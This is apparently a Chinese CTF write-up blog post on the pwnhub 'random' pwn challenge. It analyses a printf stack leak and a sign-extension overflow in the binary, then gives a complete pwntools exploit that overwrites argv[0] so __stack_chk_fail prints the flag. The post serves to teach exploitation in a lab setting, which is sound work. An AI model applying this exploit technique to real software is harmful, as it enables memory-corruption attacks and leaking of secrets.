# pwnhub公开赛二期PWN-random




## random

### 总结

根据本题，学习与收获有：
- 有时候IDA反编译出来的代码不一定准确，需要结合汇编代码进行分析
- 之前的`__stack_chk_fail`函数，如果把`args[0]`处的地址覆盖为存储`flag`的地址，那么检测到`canary`被修改的时候，就会把`flag`打印出来

<!-- more -->

### 题目分析

#### checksec

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210406231504.png)

保护全开

#### 函数分析

部分函数已重命名！

##### main

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210406231657.png)

在`main`函数中，调用了初始化函数，还有`prctl`函数，以及读取用户输入，输出一段欢迎信息。

这里因为`buf`距离`rsp`为`0x20`，如果完全读满`0x10`个字符，很可能会泄露出栈地址。

##### initial

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210406231854.png)

没啥好看的

##### set_prctl

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210406231932.png)

可以用`seccomp-tools`检测一下

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210406232019.png)

禁用了`execve`

##### vuln

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210406232112.png)

这个函数的处理流程为：

- 读取`flag`到栈变量`buf`中
- 打印出了`buf`的低`1`个字节的地址
- 读取一个正整数`num`
- 读取用户输入，向栈变量`v4`里面读取`(char)(num & 0x80)`个字符

##### get_num

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210406232739.png)

读取一个正整数

##### read_input

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210406234332.png)

就是从`stdin`中读取输入，遇到`\x0a`结束。

#### 漏洞点

##### 漏洞点1：printf泄露出栈地址

在`main`函数的分析中指出，如果输入`name`的时候，长度恰好为`0x10`个可打印字符，可能泄露出栈上的内容。可结合`gdb`调试看一下：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210406235713.png)

的确能泄露出栈地址！

##### 漏洞点2：任意大小往栈地址写内容

刚开始看`IDA`的反编译结果，看了半天，没有找到新的漏洞。后来研究了一下汇编代码，结合`gdb`调试，发现在`read_input`中，传给这个函数的第二个参数，也就是`rsi`寄存器的内容。

首先分析一下汇编代码：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210407000405.png)

`dword_20204c`就是`num & 0x80`，接下来是一个`movsxd`指令，将`32`位寄存器进行符号扩展到`64`位寄存器。直接使用`$rebase(0xC1F)`断点打在`read_input`函数出，输入整数为`0xffff`：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210407001226.png)

此时的`rsi`寄存器存储的内容为`0xffffffffffffff80`，因此可以溢出写，大小基本不限！

### 利用思路

由于漏洞点只能泄露出栈地址，虽然有任意大小溢出漏洞，但是由于不知道程序的基地址，也不知道`libc`的基地址，所以无法使用`ROP`进行利用。但是考虑到程序本身读取了`flag`，且开启了`canary`保护，因此可以尝试利用`stack smash`打印出`flag`。

#### 知识点

- `stack smash`

  > 开启了`canary`保护的程序，如果发现`canary`被修改，就会执行 `__stack_chk_fail` 函数来打印 `argv[0]` 指针所指向的字符串，正常情况下，这个指针指向了程序名。`argv`在很高的栈地址。

- 如果可以不限制大小地进行栈溢出，可以修改`argv[0]`为指向`flag`的字符串地址，就能打印出`flag`。

#### 利用过程

利用步骤：

- 利用`printf`打印出栈地址，结合`gift`地址，得到存储`flag`栈地址
- 利用溢出漏洞，覆盖`argv[0]`为`flag`地址，利用`__stack_chk_fail`打印出`flag`

### EXP

#### 调试过程

本地调试的时候，随便设置了一个`flag`文件：

首先需要读取出栈地址和计算出`flag`地址：

```python
io = process('./random')
io.sendafter("tell me your name\n", 0x10 * 'a')
msg = io.recvline()
leak_stack_addr = u64(msg[-7:-1] + b'\x00\x00' )
LOG_ADDR('leak_stack_addr', leak_stack_addr)
flag_addr = leak_stack_addr - 0x320
msg = io.recvline()
buf_low_addr = int(msg[5 : -1].decode(), base=16)
LOG_ADDR('buf_low_addr', buf_low_addr)
LOG_ADDR('flag_addr', flag_addr)
```

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210407003700.png)

接下来直接对栈进行溢出，触发`stack smash`：

```python
io.sendafter("leave something?\n", str(0xffff))
io.sendline(p64(flag_addr) * 0x200)
io.interactive()
```

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210407003825.png)

#### 完整exp

```python
from pwn import *
LOG_ADDR = lambda x, y: log.success("{} ===> {}".format(x, hex(y)))

io = process('./random')
io.sendafter("tell me your name\n", 0x10 * 'a')
msg = io.recvline()
leak_stack_addr = u64(msg[-7:-1] + b'\x00\x00' )
LOG_ADDR('leak_stack_addr', leak_stack_addr)
flag_addr = leak_stack_addr - 0x320
msg = io.recvline()
buf_low_addr = int(msg[5 : -1].decode(), base=16)
LOG_ADDR('buf_low_addr', buf_low_addr)
LOG_ADDR('flag_addr', flag_addr)

io.sendafter("leave something?\n", str(0xffff))
io.sendline(p64(flag_addr) * 0x200)
io.interactive()

```

最后远程打的`flag`为：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210407004100.png)

### 引用与参考

`stack smash`: <https://ctf-wiki.org/pwn/linux/stackoverflow/fancy-rop/#stack-smash>

---

> 作者: [roderick](https://roderickchan.github.io)  
> URL: https://roderickchan.github.io/zh-cn/2021-06-05-pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B%E4%BA%8C%E6%9C%9Fpwn-random/  

